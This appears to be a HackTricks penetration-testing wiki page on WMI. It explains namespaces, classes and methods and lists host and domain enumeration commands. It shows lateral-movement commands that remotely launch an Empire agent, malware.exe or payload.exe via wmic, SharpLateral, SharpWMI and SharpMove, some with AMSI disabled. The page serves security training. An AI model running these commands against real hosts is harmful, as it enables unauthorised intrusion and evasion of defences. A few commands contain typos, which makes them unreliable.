# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## How It Works Explained

Processes can be opened on hosts where the username and either password or hash are known through the use of WMI. Commands are executed using WMI by Wmiexec, providing a semi-interactive shell experience.

**dcomexec.py:** Utilizing different DCOM endpoints, this script offers a semi-interactive shell akin to wmiexec.py, specifically leveraging the ShellBrowserWindow DCOM object. It currently supports MMC20. Application, Shell Windows, and Shell Browser Window objects. (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## WMI Fundamentals

### Namespace

Structured in a directory-style hierarchy, WMI's top-level container is \root, under which additional directories, referred to as namespaces, are organized.
Commands to list namespaces:

```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```

Classes within a namespace can be listed using:

```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```

### **Classes**

Knowing a WMI class name, such as win32_process, and the namespace it resides in is crucial for any WMI operation.
Commands to list classes beginning with `win32`:

```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```

Invocation of a class:

```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```

### Methods

Methods, which are one or more executable functions of WMI classes, can be executed.

```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```

## WMI Enumeration

### WMI Service Status

Commands to verify if the WMI service is operational:

```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```

### System and Process Information

Gathering system and process information through WMI:

```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```

For attackers, WMI is a potent tool for enumerating sensitive data about systems or domains.

```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

Remote querying of WMI for specific information, such as local admins or logged-on users, is feasible with careful command construction.

### **Manual Remote WMI Querying**

Stealthy identification of local admins on a remote machine and logged-on users can be achieved through specific WMI queries. `wmic` also supports reading from a text file to execute commands on multiple nodes simultaneously.

To remotely execute a process over WMI, such as deploying an Empire agent, the following command structure is employed, with successful execution indicated by a return value of "0":

```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```

This process illustrates WMI's capability for remote execution and system enumeration, highlighting its utility for both system administration and penetration testing.

## Automatic Tools

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```

- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)

```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```

- You could also use **Impacket's `wmiexec`**.


## References

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)


{{#include ../../banners/hacktricks-training.md}}



